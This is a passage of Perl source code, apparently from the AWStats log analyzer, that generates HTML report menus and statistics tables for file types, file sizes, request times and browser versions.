                print( $frame? "</td></tr>\n" : " &nbsp; " );
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=downloads")
                        : "$StaticLinks.downloads.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[80]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowPagesStats) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#urls\"$targetpage>$Message[29]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowPagesStats) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=urldetail")
                        : "$StaticLinks.urldetail.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[80]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ( $ShowPagesStats =~ /E/i ) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=urlentry")
                        : "$StaticLinks.urlentry.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[104]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ( $ShowPagesStats =~ /X/i ) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'}
                        || !$StaticLinks
                        ? XMLEncode("$AWScript${NewLinkParams}output=urlexit")
                        : "$StaticLinks.urlexit.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[116]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowOSStats) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#os\"$targetpage>$Message[59]</a>";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowOSStats) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=osdetail")
                        : "$StaticLinks.osdetail.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[58]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowOSStats) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=unknownos")
                        : "$StaticLinks.unknownos.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[0]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowBrowsersStats) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#browsers\"$targetpage>$Message[21]</a>";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowBrowsersStats) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=browserdetail")
                        : "$StaticLinks.browserdetail.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[58]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowBrowsersStats) {
                print( $frame
                    ? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
                    : ""
                );
                print "<a href=\""
                    . (
                    $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                        ? XMLEncode(
                        "$AWScript${NewLinkParams}output=unknownbrowser")
                        : "$StaticLinks.unknownbrowser.$StaticExt"
                )
                    . "\"$NewLinkTarget>$Message[0]</a>\n";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($ShowScreenSizeStats) {
                print( $frame? "<tr><td class=\"awsm\">" : "" );
                print
                    "<a href=\"$linkanchor#screensizes\"$targetpage>$Message[135]</a>";
                print( $frame? "</td></tr>\n" : " &nbsp; " );
            }
            if ($linetitle) { print( $frame? "" : "</td></tr>\n" ); }

            # Referers
            %menu = (
                'referer'      => $ShowOriginStats ? 1 : 0,
                'refererse'    => $ShowOriginStats ? 2 : 0,
                'refererpages' => $ShowOriginStats ? 3 : 0,
                'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )
                    ? 4
                    : 0,
                'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,
                'keywords'   => $ShowKeywordsStats   ? 6 : 0
            );
            %menulink = (
                'referer'      => 1,
                'refererse'    => 2,
                'refererpages' => 2,
                'keys'         => 1,
                'keyphrases'   => 2,
                'keywords'     => 2
            );
            %menutext = (
                'referer'      => $Message[37],
                'refererse'    => $Message[126],
                'refererpages' => $Message[127],
                'keys'         => $Message[14],
                'keyphrases'   => $Message[120],
                'keywords'     => $Message[121]
            );
            HTMLShowMenuCateg(
                'referers',     $Message[23],
                'menu7.png',    $frame,
                $targetpage,    $linkanchor,
                $NewLinkParams, $NewLinkTarget,
                \%menu,         \%menulink,
                \%menutext
            );

            # Others
            %menu = (
                'filetypes' => ( $ShowFileTypesStats =~ /C/i ) ? 1 : 0,
                'misc' => $ShowMiscStats ? 2 : 0,
                'errors' => ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats )
                    ? 3
                    : 0,
                'clusters' => $ShowClusterStats ? 5 : 0
            );
            %menulink = (
                'filetypes' => 1,
                'misc'      => 1,
                'errors'    => 1,
                'clusters'  => 1
            );
            %menutext = (
                'filetypes' => $Message[98],
                'misc'      => $Message[139],
                'errors'    =>
                    ( $ShowSMTPErrorsStats ? $Message[147] : $Message[32] ),
                'clusters' => $Message[155]
            );
            my $idx = 0;
            foreach ( sort keys %TrapInfosForHTTPErrorCodes ) {
                $menu{"errors$_"}     = $ShowHTTPErrorsStats ? 4+$idx : 0;
                $menulink{"errors$_"} = 2;
                $menutext{"errors$_"} = $Message[49] . ' (' . $_ . ')';
                $idx++;
            }
            HTMLShowMenuCateg(
                'others',       $Message[2],
                'menu8.png',    $frame,
                $targetpage,    $linkanchor,
                $NewLinkParams, $NewLinkTarget,
                \%menu,         \%menulink,
                \%menutext
            );

            # Extra/Marketing
            %menu     = ();
            %menulink = ();
            %menutext = ();
            my $i = 1;
            foreach ( 1 .. @ExtraName - 1 ) {
                $menu{"extra$_"}        = $i++;
                $menulink{"extra$_"}    = 1;
                $menutext{"extra$_"}    = $ExtraName[$_];
                $menu{"allextra$_"}     = $i++;
                $menulink{"allextra$_"} = 2;
                $menutext{"allextra$_"} = $Message[80];
            }
            HTMLShowMenuCateg(
                'extra',        $Message[134],
                '',             $frame,
                $targetpage,    $linkanchor,
                $NewLinkParams, $NewLinkTarget,
                \%menu,         \%menulink,
                \%menutext
            );
            print "</table>\n";
        }
        else {

            # Menu Applet
            if ($frame) { }
            else { }
        }

        #print ($frame?"":"<br />\n");
        print "<br />\n";
    }

    # Print Back link
    elsif ( !$HTMLOutput{'main'} ) {
        print "<table>\n";
        $NewLinkParams =~ s/(^|&|&amp;)hostfilter=[^&]*//i;
        $NewLinkParams =~ s/(^|&|&amp;)urlfilter=[^&]*//i;
        $NewLinkParams =~ s/(^|&|&amp;)refererpagesfilter=[^&]*//i;
        $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
        $NewLinkParams =~ s/^&amp;//;
        $NewLinkParams =~ s/&amp;$//;
        if (   !$DetailedReportsOnNewWindows
            || $FrameName eq 'mainright'
            || $QueryString =~ /buildpdf/i )
        {
            print "<tr><td class=\"aws\"><a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}")
                    : "$StaticLinks.$StaticExt"
            )
                . "\">$Message[76]</a></td></tr>\n";
        }
        else {
            print
                "<tr><td class=\"aws\"><a href=\"javascript:parent.window.close();\">$Message[118]</a></td></tr>\n";
        }
        print "</table>\n";
        print "\n";
    }
}

#------------------------------------------------------------------------------
# Function:     Prints the File Type table
# Parameters:   _
# Input:        $NewLinkParams, $NewLinkTargets
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainFileType{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;
    if (!$LevelForFileTypesDetection > 0){return;}
    if ($Debug) { debug( "ShowFileTypesStatsCompressionStats", 2 ); }
    print "$Center<a name=\"filetypes\">&nbsp;</a><br />\n";
    my $Totalh = 0;
    foreach ( keys %_filetypes_h ) { $Totalh += $_filetypes_h{$_}; }
    my $Totalk = 0;
    foreach ( keys %_filetypes_k ) { $Totalk += $_filetypes_k{$_}; }
    my $title = "$Message[73]";
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=FILETYPES&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    if ( $ShowFileTypesStats =~ /C/i ) { $title .= " - $Message[98]"; }

    # build keylist at top
    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_filetypes_h,
        \%_filetypes_h );

    &tab_head( "$title", 19, 0, 'filetypes' );

    # Graph the top five in a pie chart
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);
            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;
                push @blocklabel, "$key";
                $cnt++;
                if ($cnt > 4) { last; }
            }
            print "<tr><td colspan=\"7\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "$Message[73]",              "filetypes",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"3\">$Message[73]</th>";

    if ( $ShowFileTypesStats =~ /H/i ) {
        print "<th bgcolor=\"#$color_h\" width=\"80\""
            . Tooltip(4)
            . ">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    }
    if ( $ShowFileTypesStats =~ /B/i ) {
        print "<th bgcolor=\"#$color_k\" width=\"80\""
            . Tooltip(5)
            . ">$Message[75]</th><th bgcolor=\"#$color_k\" width=\"80\">$Message[15]</th>";
    }
    if ( $ShowFileTypesStats =~ /C/i ) {
        print
            "<th bgcolor=\"#$color_k\" width=\"100\">$Message[100]</th><th bgcolor=\"#$color_k\" width=\"100\">$Message[101]</th><th bgcolor=\"#$color_k\" width=\"100\">$Message[99]</th>";
    }
    print "</tr>\n";
    my $total_con = 0;
    my $total_cre = 0;
    my $count     = 0;
    foreach my $key (@keylist) {
        my $p_h = '&nbsp;';
        my $p_k = '&nbsp;';
        if ($Totalh) {
            $p_h = int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($Totalk) {
            $p_k = int( $_filetypes_k{$key} / $Totalk * 1000 ) / 10;
            $p_k = "$p_k %";
        }
        if ( $key eq 'Unknown' ) {
            print "<tr><td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/mime\/unknown.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\" colspan=\"2\"><span style=\"color: #$color_other\">$Message[0]</span></td>";
        }
        else {
            my $nameicon = $MimeHashLib{$key}[0] || "notavailable";
            my $nametype = $MimeHashFamily{$MimeHashLib{$key}[0]} || "&nbsp;";
            print "<tr><td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/mime\/$nameicon.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\">$key</td>";
            print "<td class=\"aws\">$nametype</td>";
        }
        if ( $ShowFileTypesStats =~ /H/i ) {
            print "<td>".Format_Number($_filetypes_h{$key})."</td><td>$p_h</td>";
        }
        if ( $ShowFileTypesStats =~ /B/i ) {
            print '<td nowrap="nowrap">'
                . Format_Bytes( $_filetypes_k{$key} )
                . "</td><td>$p_k</td>";
        }
        if ( $ShowFileTypesStats =~ /C/i ) {
            if ( $_filetypes_gz_in{$key} ) {
                my $percent = int(
                    100 * (
                        1 - $_filetypes_gz_out{$key} /
                            $_filetypes_gz_in{$key}
                    )
                );
                printf(
                    "<td>%s</td><td>%s</td><td>%s (%s%)</td>",
                    Format_Bytes( $_filetypes_gz_in{$key} ),
                    Format_Bytes( $_filetypes_gz_out{$key} ),
                    Format_Bytes(
                        $_filetypes_gz_in{$key} -
                            $_filetypes_gz_out{$key}
                    ),
                    $percent
                );
                $total_con += $_filetypes_gz_in{$key};
                $total_cre += $_filetypes_gz_out{$key};
            }
            else {
                print "<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>";
            }
        }
        print "</tr>\n";
        $count++;
    }

    # Add total (only useful if compression is enabled)
    if ( $ShowFileTypesStats =~ /C/i ) {
        my $colspan = 3;
        if ( $ShowFileTypesStats =~ /H/i ) { $colspan += 2; }
        if ( $ShowFileTypesStats =~ /B/i ) { $colspan += 2; }
        print "<tr>";
        print
            "<td class=\"aws\" colspan=\"$colspan\"><b>$Message[98]</b></td>";
        if ( $ShowFileTypesStats =~ /C/i ) {
            if ($total_con) {
                my $percent =
                    int( 100 * ( 1 - $total_cre / $total_con ) );
                printf(
                    "<td>%s</td><td>%s</td><td>%s (%s%)</td>",
                    Format_Bytes($total_con),
                    Format_Bytes($total_cre),
                    Format_Bytes( $total_con - $total_cre ),
                    $percent
                );
            }
            else {
                print "<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>";
            }
        }
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the File Size Table
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainFileSize{
    if ($Debug) { debug("ShowFileSizesStats",2); }
    my $FirstTime = 0;
    my $LastTime  = 0;
    foreach my $key ( keys %FirstTime ) {
        my $keyqualified = 0;
        if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
        if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
        if ($keyqualified) {
            if ( $FirstTime{$key}
                && ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
            {
                $FirstTime = $FirstTime{$key};
            }
            if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
                $LastTime = $LastTime{$key};
            }
        }
    }

    my $inicio = 0;
    my $fim = 0;
    if ($FirstTime =~ /$regdate/o) { $inicio = Time::Local::timelocal($6, $5, $4, $3, $2-1, $1); }
    if ($LastTime =~ /$regdate/o) { $fim = Time::Local::timelocal($6, $5, $4, $3, $2-1, $1); }
    my $periodo = $fim - $inicio;
    my $number_of_requests = 0;
    my $request_frequency_average = 0;
    foreach my $key (@PayloadRange) {
        $number_of_requests += $_filesize{$key};
    }
    if ($periodo) { $request_frequency_average = $number_of_requests/$periodo;}
    else { $request_frequency_average = 0 };
    print "$Center<a name=\"filesizes\">&nbsp;</a><br />\n";
    my $title = "$Message[186]";
    &tab_head($title, 19, 0, 'filesizes');
    my $Totals = 0;
    my $average_s = 0;
    foreach (@PayloadRange) {
        $average_s += ( $_filesize{$_} || 0 ) * $PayloadAverage{$_};
        $Totals += $_filesize{$_} || 0;
    }
    if ($Totals) { $average_s = int($average_s / $Totals); }
    else { $average_s = '?'; }
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"".Tooltip(1)."><th>$Message[182]: $number_of_requests - $Message[183]: $periodo $Message[184] - $Message[185]: ".sprintf ("%.6f",$request_frequency_average)."</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[181]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_s = 0;
    my $count = 0;
    foreach my $key (@PayloadRange) {
        my $p = 0;
        my $f = 0;
        if ($Totals) { $p = int($_filesize{$key} / $Totals * 1000) / 10; }
        if ($periodo) { $f = $_filesize{$key} / $periodo; }
        $total_s += $_filesize{$key} || 0;
        print "<tr><td class=\"aws\">$key</td>";
        print "<td>".($_filesize{$key}? sprintf("%.5f",$f):"&nbsp;")."</td>";
        print "<td>".($_filesize{$key}? $_filesize{$key}:"&nbsp;")."</td>";
        print "<td>".($_filesize{$key}? "$p %":"&nbsp;")."</td>";
        print "</tr>\n";
        $count++;
    }
    my $rest_s = $TotalVisits-$total_s;
    if ($rest_s > 0) {
        my $p = 0;
        if ($TotalVisits) { $p = int($rest_s / $TotalVisits * 1000) / 10; }
        print "<tr".Tooltip(20)."><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td>";
        print "<td>$rest_s</td>";
        print "<td>".($rest_s?"$p %":"&nbsp;")."</td>";
        print "</tr>\n";
    }

    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints Request Time table
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainRequestTime{
    if ($Debug) { debug("ShowRequestTimesStats", 2); }
    my $FirstTime = 0;
    my $LastTime  = 0;
    foreach my $key ( keys %FirstTime ) {
        my $keyqualified = 0;
        if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
        if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
        if ($keyqualified) {
            if ( $FirstTime{$key}
                && ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
            {
                $FirstTime = $FirstTime{$key};
            }
            if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
                $LastTime = $LastTime{$key};
            }
        }
    }

    my $inicio = 0;
    my $fim = 0;
    if ($FirstTime =~ /$regdate/o) { $inicio = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
    if ($LastTime =~ /$regdate/o) { $fim = Time::Local::timelocal($6,$5,$4,$3,$2-1,$1); }
    my $periodo = $fim - $inicio;
    my $number_of_requests = 0;
    my $request_frequency_average = 0;
    foreach my $key (@TimeRange) {
        $number_of_requests += $_requesttime{$key};
    }
    if ($periodo) { $request_frequency_average = $number_of_requests / $periodo;}
    else { $request_frequency_average = 0};
    print "$Center<a name=\"requesttimes\">&nbsp;</a><br />\n";
    my $title = "$Message[188]";
    &tab_head($title, 19, 0, 'requesttimes');
    my $Totals = 0;
    my $average_s = 0;
    foreach (@TimeRange) {
        $average_s += ($_requesttime{$_} || 0) * $TimeAverage{$_};
        $Totals += $_requesttime{$_} || 0;
    }
    if ($Totals) { $average_s = int($average_s / $Totals); }
    else { $average_s = '?'; }
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"".Tooltip(1)."><th>$Message[182]: $number_of_requests - $Message[183]: $periodo $Message[184] - $Message[185]: ".sprintf ("%.6f",$request_frequency_average)."</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[181]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_s = 0;
    my $count = 0;
    foreach my $key (@TimeRange) {
        my $p = 0;
        my $f = 0;
        if ($Totals) { $p = int($_requesttime{$key} / $Totals * 1000) / 10; }
        if ($periodo) { $f = $_requesttime{$key} / $periodo; }
        $total_s += $_requesttime{$key} || 0;
        print "<tr><td class=\"aws\">$key</td>";
        print "<td>".($_requesttime{$key} ? sprintf("%.5f",$f) : "&nbsp;")."</td>";
        print "<td>".($_requesttime{$key} ? $_requesttime{$key} : "&nbsp;")."</td>";
        print "<td>".($_requesttime{$key} ? "$p %" : "&nbsp;")."</td>";
        print "</tr>\n";
        $count++;
    }
    my $rest_s = $TotalVisits - $total_s;
    if ($rest_s > 0) {
        my $p = 0;
        if ($TotalVisits) { $p = int($rest_s / $TotalVisits * 1000) / 10; }
        print "<tr".Tooltip(20)."><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td>";
        print "<td>$rest_s</td>";
        print "<td>".($rest_s?"$p %":"&nbsp;")."</td>";
        print "</tr>\n";
    }

    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Browser Detail frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowBrowserDetail{
    # Show browsers versions
    print "$Center<a name=\"browsersversions\">&nbsp;</a><br />";
    my $title = "$Message[21]";
    &tab_head( "$title", 19, 0, 'browsersversions' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">$Message[58]</th>";
    print
        "<th width=\"80\">$Message[111]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    print
        "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    print "<th>&nbsp;</th>";
    print "</tr>\n";
    my $total_h = 0;
    my $total_p = 0;
    my $count = 0;
    &BuildKeyList( MinimumButNoZero( scalar keys %_browser_h, 500 ),
        1, \%_browser_h, \%_browser_p );
    my %keysinkeylist = ();
    my $max_h = 1;
    my $max_p = 1;

    # Count total by family
    my %totalfamily_h = ();
    my %totalfamily_p = ();
    my $TotalFamily_h = 0;
    my $TotalFamily_p = 0;
    BROWSERLOOP: foreach my $key (@keylist) {
        $total_h += $_browser_h{$key};
        if ( $_browser_h{$key} > $max_h ) {
            $max_h = $_browser_h{$key};
        }
        $total_p += $_browser_p{$key};
        if ( $_browser_p{$key} > $max_p ) {
            $max_p = $_browser_p{$key};
        }
        foreach my $family ( keys %BrowsersFamily ) {
            if ( $key =~ /^$family/i ) {
                $totalfamily_h{$family} += $_browser_h{$key};
                $totalfamily_p{$family} += $_browser_p{$key};
                $TotalFamily_h          += $_browser_h{$key};
                $TotalFamily_p          += $_browser_p{$key};
                next BROWSERLOOP;
            }
        }
    }

    # Write records grouped in a browser family
    foreach my $family (
        sort { $BrowsersFamily{$a} <=> $BrowsersFamily{$b} }
            keys %BrowsersFamily
    )
    {
        my $p_h = '&nbsp;';
        my $p_p = '&nbsp;';
        if ($total_h) {
            $p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($total_p) {
            $p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;
            $p_p = "$p_p %";
        }
        my $familyheadershown = 0;

        #foreach my $key ( reverse sort keys %_browser_h ) {
        foreach my $key ( reverse sort SortBrowsers keys %_browser_h ) {
            if ( $key =~ /^$family(.*)/i ) {
                if ( !$familyheadershown ) {
                    print
                        "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>"
                            . uc($family)
                            . "</b></td>";
                    print "<td>&nbsp;</td><td><b>"
                        . Format_Number(int( $totalfamily_p{$family} ))
                        . "</b></td><td><b>$p_p</b></td>";
                    print "<td><b>"
                        . Format_Number(int( $totalfamily_h{$family} ))
                        . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
                    print "</tr>\n";
                    $familyheadershown = 1;
                }
                $keysinkeylist{$key} = 1;
                my $ver = $1;
                my $p_h = '&nbsp;';
                my $p_p = '&nbsp;';
                if ($total_h) {
                    $p_h =
                        int( $_browser_h{$key} / $total_h * 1000 ) / 10;
                    $p_h = "$p_h %";
                }
                if ($total_p) {
                    $p_p =
                        int( $_browser_p{$key} / $total_p * 1000 ) / 10;
                    $p_p = "$p_p %";
                }
                print "<tr>";
                print "<td"
                    . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                    . "><img src=\"$DirIcons\/browser\/$family.png\""
                    . AltTitle("")
                    . " /></td>";
                print "<td class=\"aws\">"
                    . ucfirst($family) . " "
                    . ( $ver ? "$ver" : "?" ) . "</td>";
                print "<td>"
                    . (
                    $BrowsersHereAreGrabbers{$family}
                        ? "<b>$Message[112]</b>"
                        : "$Message[113]"
                )
                    . "</td>";
                my $bredde_h = 0;
                my $bredde_p = 0;
                if ( $max_h > 0 ) {
                    $bredde_h =
                        int( $BarWidth * ( $_browser_h{$key} || 0 ) /
                            $max_h ) + 1;
                }
                if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
                    $bredde_h = 2;
                }
                if ( $max_p > 0 ) {
                    $bredde_p =
                        int( $BarWidth * ( $_browser_p{$key} || 0 ) /
                            $max_p ) + 1;
                }
                if ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {
                    $bredde_p = 2;
                }
                print "<td>".Format_Number($_browser_p{$key})."</td><td>$p_p</td>";
                print "<td>".Format_Number($_browser_h{$key})."</td><td>$p_h</td>";
                print "<td class=\"aws\">";

                # alt and title are not provided to reduce page size
                if ($ShowBrowsersStats) {
                    print
                        "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
                    print
                        "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\" /><br />";
                }
                print "</td>";
                print "</tr>\n";
                $count++;
            }
        }
    }

    # Write other records
    my $familyheadershown = 0;
    foreach my $key (@keylist) {
        if ( $keysinkeylist{$key} ) { next; }
        if ( !$familyheadershown )  {
            my $p_h = '&nbsp;';
            my $p_p = '&nbsp;';
            if ($total_p) {
                $p_p =
                    int( ( $total_p - $TotalFamily_p ) / $total_p * 1000 ) /
                        10;
                $p_p = "$p_p %";
            }
            if ($total_h) {
                $p_h =
                    int( ( $total_h - $TotalFamily_h ) / $total_h * 1000 ) /
                        10;
                $p_h = "$p_h %";
            }
            print
                "<tr bgcolor=\"#F6F6F6\"><td class=\"aws\" colspan=\"2\"><b>$Message[2]</b></td>";
            print "<td>&nbsp;</td><td><b>"
                . Format_Number(( $total_p - $TotalFamily_p ))
                . "</b></td><td><b>$p_p</b></td>";
            print "<td><b>"
                . Format_Number(( $total_h - $TotalFamily_h ))
                . "</b></td><td><b>$p_h</b></td><td>&nbsp;</td>";
            print "</tr>\n";
            $familyheadershown = 1;
        }
        my $p_h = '&nbsp;';
        my $p_p = '&nbsp;';
        if ($total_h) {
            $p_h = int( $_browser_h{$key} / $total_h * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($total_p) {
            $p_p = int( $_browser_p{$key} / $total_p * 1000 ) / 10;
            $p_p = "$p_p %";
        }
        print "<tr>";
        if ( $key eq 'Unknown' ) {
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/browser\/unknown.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td><td width=\"80\">?</td>";
        }
        else {
            my $keywithoutcumul = $key;
            $keywithoutcumul =~ s/cumul$//i;
            my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}
                || $keywithoutcumul;
            my $nameicon = $BrowsersHashIcon{$keywithoutcumul}
                || "notavailable";
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/browser\/$nameicon.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\">$libbrowser</td><td>"
                . (
                $BrowsersHereAreGrabbers{$key}
                    ? "<b>$Message[112]</b>"
                    : "$Message[113]"
            )
                . "</td>";
        }
        my $bredde_h = 0;
        my $bredde_p = 0;
        if ( $max_h > 0 ) {
            $bredde_h =
                int( $BarWidth * ( $_browser_h{$key} || 0 ) / $max_h ) +
                    1;
        }
        if ( $max_p > 0 ) {
            $bredde_p =
                int( $BarWidth * ( $_browser_p{$key} || 0 ) / $max_p ) +
                    1;
        }
        if ( ( $bredde_h == 1 ) && $_browser_h{$key} ) {
            $bredde_h = 2;
        }
        if ( ( $bredde_p == 1 ) && $_browser_p{$key} ) {
            $bredde_p = 2;
        }
        print "<td>".Format_Number($_browser_p{$key})."</td><td>$p_p</td>";
        print "<td>".Format_Number($_browser_h{$key})."</td><td>$p_h</td>";
        print "<td class=\"aws\">";

        # alt and title are not provided to reduce page size
        if ($ShowBrowsersStats) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\" /><br />";
            print
